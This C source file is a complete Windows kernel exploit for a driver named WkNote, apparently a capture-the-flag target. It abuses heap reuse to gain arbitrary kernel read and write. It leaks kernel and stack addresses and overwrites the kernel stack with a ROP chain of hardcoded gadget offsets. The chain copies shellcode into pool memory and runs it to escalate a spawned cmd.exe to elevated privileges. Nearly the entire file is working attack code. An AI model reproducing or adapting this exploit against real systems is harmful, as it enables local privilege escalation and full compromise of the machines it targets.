#include <Windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include "KernelStruct.h"
#include "../WkNote/WkNote.h"

#pragma warning(disable : 4200)

#define BASE			0x140000000
#define OFFSET(addr)	((addr) - (BASE))
#define ADDR(offset)	((ULONG_PTR)kernelBase + (offset))

/*
ULONG_PTR ofs_pop_rcx    = OFFSET(0x1402036bf);
ULONG_PTR ofs_pop_rdx    = OFFSET(0x140371fe4);
ULONG_PTR ofs_pop_r8     = OFFSET(0x1402a1584);
ULONG_PTR ofs_pop_rbp    = OFFSET(0x14020056b);
ULONG_PTR ofs_mov_r8_rax = OFFSET(0x1402fe2e8); // mov r8, rax ; mov rax, r8 ; ret
ULONG_PTR ofs_mov_rcx_r8 = OFFSET(0x14089aff8); // mov rcx, r8 ; mov rax, rcx ; ret
ULONG_PTR ofs_jmp_rax    = OFFSET(0x1402021cd);

ULONG_PTR ofs_KiKernelSysretExit  = OFFSET(0x140af8dc0);
ULONG_PTR ofs_KiSystemServiceExit = OFFSET(0x1404273F0);
*/

ULONG_PTR ofs_ret        = OFFSET(0x14020008d);
ULONG_PTR ofs_pop_rcx    = OFFSET(0x1402036bf);
ULONG_PTR ofs_pop_rdx    = OFFSET(0x1403d1a22);
ULONG_PTR ofs_pop_r8     = OFFSET(0x1402a1324);
ULONG_PTR ofs_pop_rbp    = OFFSET(0x14020056b);
ULONG_PTR ofs_mov_r8_rax = OFFSET(0x1402fe2d8); // mov r8, rax ; mov rax, r8 ; ret
ULONG_PTR ofs_mov_rcx_r8 = OFFSET(0x14089b9e8); // mov rcx, r8 ; mov rax, rcx ; ret
ULONG_PTR ofs_jmp_rax    = OFFSET(0x140222b5b);

FARPROC NtQuerySystemInformation = NULL;
PVOID kernelBase = NULL;

typedef struct NoteEnt {
	PCHAR Buf;
	ULONG nSpace, nWritten;
} NOTE_ENT, *PNOTE_ENT;

int exploit(DWORD cmdPid);
PVOID GetKernelBase(void);
PVOID GetProcessStack(DWORD Pid);
PVOID GetKernelSymbolAddress(const char* symName);
DWORD spawnCmd(void);
static void dump(void* buf, unsigned long size);

extern void Shellcode(void);
extern ULONG_PTR kPsLookupProcessByProcessId;
extern ULONG_PTR kPsReferencePrimaryToken;

int main(int argc, char* argv[]) {
	srand(GetTickCount());

	while(exploit(argc > 1 ? atoi(argv[1]) : 0) > 0);
	return 0;
}

int exploit(DWORD cmdPid){
	HANDLE hDevice[2] = {NULL};
	LPCWSTR lpDeviceName = L"\\\\.\\WkNote";
	DWORD nBytesRetruned;
	WKNOTE_IOREQ req;
	NOTE_ENT FakeNote[4];

	for (;;) {
		hDevice[0] = CreateFile(lpDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDevice[0] == INVALID_HANDLE_VALUE) {
			wprintf(L"[-] CreateFile failed (%d).\n", GetLastError());
			return -1;
		}

		UINT64 randInt = rand();
		wprintf(L"rand: %llx\n", randInt);

		FakeNote[1] = (NOTE_ENT){
			.Buf = (PCHAR)randInt,
			.nSpace = 0,
			.nWritten = 0,
		};

		req.Size = 0x78;
		for (UINT16 i = 0; i < 4; i++) {
			req.Id = i;
			DeviceIoControl(hDevice[0], IOCTL_WKNOTE_ALLOCATE, &req, sizeof(req), NULL, 0, &nBytesRetruned, NULL);
			DeviceIoControl(hDevice[0], IOCTL_WKNOTE_SELECT, &req, sizeof(req), NULL, 0, &nBytesRetruned, NULL);
			WriteFile(hDevice[0], FakeNote, sizeof(FakeNote), &nBytesRetruned, NULL);
		}

		CloseHandle(hDevice[0]);

		hDevice[0] = CreateFile(lpDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDevice[0] == INVALID_HANDLE_VALUE) {
			wprintf(L"[-] CreateFile failed (%d).\n", GetLastError());
			return -1;
		}

		hDevice[1] = CreateFile(lpDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDevice[1] == INVALID_HANDLE_VALUE) {
			wprintf(L"[-] CreateFile failed (%d).\n", GetLastError());
			return -1;
		}

		//DeviceIoControl(hDevice[1], IOCTL_WKNOTE_ALLOCATE, &(WKNOTE_IOREQ){ .Id = 0, .Size = 0x100, }, sizeof(WKNOTE_IOREQ), NULL, 0, &nBytesRetruned, NULL);

		for (UINT16 i = 0; i < 4; i++) {
			req.Id = i;
			DeviceIoControl(hDevice[0], IOCTL_WKNOTE_SELECT, &req, sizeof(req), NULL, 0, &nBytesRetruned, NULL);
			if(!ReadFile(hDevice[0], FakeNote, sizeof(FakeNote), &nBytesRetruned, NULL))
				continue;

			if ((UINT64)FakeNote[1].Buf == randInt && FakeNote[1].nSpace == 0xdeadbeef)
				goto NEXT;
		}

		wprintf(L"[-] Failed reuse heap\n");
		CloseHandle(hDevice[0]);
		CloseHandle(hDevice[1]);
	}

	//wprintf(L"[+] Heap: %p\n", FakeNote[0].Buf);
	//DeviceIoControl(hDevice[1], IOCTL_WKNOTE_REMOVE, &(WKNOTE_IOREQ){ .Id = 0 }, sizeof(WKNOTE_IOREQ), NULL, 0, &nBytesRetruned, NULL);

NEXT:
	wprintf(L"[+] Found!\n");

	kernelBase = GetKernelBase();
	kPsLookupProcessByProcessId = (ULONG_PTR)GetKernelSymbolAddress("PsLookupProcessByProcessId");
	kPsReferencePrimaryToken    = (ULONG_PTR)GetKernelSymbolAddress("PsReferencePrimaryToken");

	DWORD currentPid = GetCurrentProcessId();
	wprintf(L"[*] Searching stack of current process (pid:%d)\n", currentPid);
	PVOID pKernelStack = GetProcessStack(currentPid);

	DeviceIoControl(hDevice[0], IOCTL_WKNOTE_REMOVE, &req, sizeof(req), NULL, 0, &nBytesRetruned, NULL);
	req.Size = 0x78;
	DeviceIoControl(hDevice[0], IOCTL_WKNOTE_ALLOCATE, &req, sizeof(req), NULL, 0, &nBytesRetruned, NULL);

	FakeNote[0].Buf      = (PVOID)((ULONG_PTR)pKernelStack-0x898);
	FakeNote[0].nSpace   = 0x400;
	FakeNote[0].nWritten = 0x400;
	WriteFile(hDevice[0], FakeNote, sizeof(FakeNote), &nBytesRetruned, NULL);

	PUINT64 lpUserBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x400);
	if (!lpUserBuffer) {
		wprintf(L"[-] HeapAlloc error\n");
		return -1;
	}

	if (ReadFile(hDevice[1], lpUserBuffer, 0x400, &nBytesRetruned, NULL)) {
		puts("Before");
		dump(lpUserBuffer, 0x100);
		if (lpUserBuffer[8] != (ULONG_PTR)kernelBase + 0x7cd1ae)
			return 1;

		if (!cmdPid)
			cmdPid = spawnCmd();
		PULONG_PTR pStack = lpUserBuffer;
		*pStack++ = ADDR(ofs_pop_rcx);
		*pStack++ = 0;
		*pStack++ = ADDR(ofs_pop_rdx);
		*pStack++ = 0x100;
		*pStack++ = ADDR(ofs_pop_r8);
		*pStack++ = 0x41414141;
		*pStack++ = (ULONG_PTR)GetKernelSymbolAddress("ExAllocatePoolWithTag");
		*pStack++ = ADDR(ofs_mov_r8_rax);
		*pStack++ = ADDR(ofs_mov_rcx_r8);
		*pStack++ = ADDR(ofs_pop_rdx);
		*pStack++ = (ULONG_PTR)Shellcode;
		*pStack++ = ADDR(ofs_pop_r8);
		*pStack++ = 0x100;
		*pStack++ = (ULONG_PTR)GetKernelSymbolAddress("memcpy");
		*pStack++ = ADDR(ofs_pop_rcx);
		*pStack++ = cmdPid; // target
		*pStack++ = ADDR(ofs_jmp_rax);

		puts("After");
		dump(lpUserBuffer, 0x100);

		wprintf(L"[+] Exploiting to escalate the privileges of a process (pid:%d)\n", cmdPid);
		WriteFile(hDevice[1], lpUserBuffer, (DWORD)((ULONG_PTR)pStack - (ULONG_PTR)lpUserBuffer), &nBytesRetruned, NULL);

		/*
		req.Size = 0x40;
		DeviceIoControl(hDevice[0], IOCTL_WKNOTE_REMOVE, &req, sizeof(req), NULL, 0, &nBytesRetruned, NULL);
		DeviceIoControl(hDevice[0], IOCTL_WKNOTE_ALLOCATE, &req, sizeof(req), NULL, 0, &nBytesRetruned, NULL);

		pNoteArr[0].Buf = (PVOID)((UINT64)pkHalDispatchTable+8);
		pNoteArr[0].nSpace = 0x100;
		WriteFile(hDevice[0], lpUserBuffer, 0x40, &nBytesRetruned, NULL);
		WriteFile(hDevice[1], (PVOID[]){(PVOID)0xdeadbeef}, 8, &nBytesRetruned, NULL);

		pNoteArr[0].Buf = 0;
		pNoteArr[0].nSpace = 0xdeadbeef;
		WriteFile(hDevice[0], lpUserBuffer, 0x40, &nBytesRetruned, NULL);

		getchar();

		ULONG dummy;
		NtQueryIntervalProfile(2, &dummy);
		*/
	}
	else
		return 1;

	HeapFree(GetProcessHeap(), 0, lpUserBuffer);

	CloseHandle(hDevice[0]);
	CloseHandle(hDevice[1]);

	return 0;
}

PVOID GetKernelBase(void) {
	if (!NtQuerySystemInformation) {
		HMODULE hNtdll = GetModuleHandle(TEXT("ntdll"));
		NtQuerySystemInformation = GetProcAddress(hNtdll, "NtQuerySystemInformation");
	}

    ULONG len;
    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
    PSYSTEM_MODULE_INFORMATION pModuleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len);
	if (!pModuleInfo) {
		wprintf(L"[-] HeapAlloc error\n");
		return NULL;
	}
    NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, NULL);

	PVOID KernelBase = pModuleInfo->Modules[0].ImageBaseAddress;
    printf("[+] %s: %p\n", pModuleInfo->Modules[0].Name, KernelBase);

	HeapFree(GetProcessHeap(), 0, pModuleInfo);

   return KernelBase;
}

PVOID GetProcessStack(DWORD Pid) {
	PVOID stackBase = 0;

	if (!NtQuerySystemInformation) {
		HMODULE hNtdll = GetModuleHandle(TEXT("ntdll"));
		NtQuerySystemInformation = GetProcAddress(hNtdll, "NtQuerySystemInformation");
	}

	while (!stackBase) {
		ULONG len;
		NtQuerySystemInformation(SystemExtendedProcessInformation, NULL, 0, &len);
		PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len);
		if (!pProcessInfo) {
			wprintf(L"[-] HeapAlloc error\n");
			return NULL;
		}
		NtQuerySystemInformation(SystemExtendedProcessInformation, pProcessInfo, len, NULL);

		for (PSYSTEM_EXTENDED_PROCESS_INFORMATION p = pProcessInfo; p->NextEntryOffset != 0; p = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)p + p->NextEntryOffset)) {
			if (p->UniqueProcessId == Pid)
				stackBase = p->Threads[0].StackBase;
		}

		HeapFree(GetProcessHeap(), 0, pProcessInfo);
	}
	wprintf(L"[+] Stack Base %p\n", stackBase);

	return stackBase;
}

PVOID GetKernelSymbolAddress(const char* symName) {
	static HMODULE ntoskrnl;

	if(!kernelBase)
		kernelBase = GetKernelBase();

	if(!ntoskrnl)
		ntoskrnl = LoadLibrary(TEXT("ntoskrnl.exe"));
	if(!ntoskrnl)
		return NULL;

    PVOID userAddr = (PVOID)GetProcAddress(ntoskrnl, symName);
	if (!userAddr)
		return NULL;

    return (PVOID)((ULONG_PTR)kernelBase + (ULONG_PTR)userAddr - (ULONG_PTR)ntoskrnl);
}

DWORD spawnCmd(void) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// Start the child process. 
	if (!CreateProcess(NULL, TEXT("\"C:\\Windows\\System32\\cmd.exe\""), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) ) {
		wprintf(L"[-] CreateProcess failed (%d).\n", GetLastError());
		return (DWORD)-1;
	}

	DWORD pid = pi.dwProcessId;
	wprintf(L"[*] Spawning shell (pid:%d)\n", pid);

	Sleep(500);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return pid;
}

static void dump(void *buf, unsigned long size){
	PULONG64 p = buf;

	wprintf(L"=== DUMP (%p-%p) ===\n", buf, (PVOID)((ULONG_PTR)buf+size));
	for(unsigned i=0; i<size/8; i++){
		wprintf(L"%016llx ", p[i]);
		if(i%4 == 3)
			putchar('\n');
	}
	putchar('\n');
}
